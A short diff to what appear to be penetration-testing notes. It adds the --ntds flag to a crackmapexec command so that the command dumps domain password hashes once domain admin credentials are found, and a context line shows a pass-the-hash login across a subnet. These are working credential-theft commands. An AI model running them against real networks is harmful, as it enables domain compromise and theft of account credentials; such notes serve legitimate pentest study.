@@ -15,7 +15,7 @@ crackmapexec smb 192.168.16.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e7
 ### Run this command once domain admin creds are discovered
 
 ```bash
-crackmapexec smb 10.10.10.10/24 -u water -p password123
+crackmapexec smb 10.10.10.10/24 -u water -p password123 --ntds
 #new users and their hashes will be discovered
 ```
 
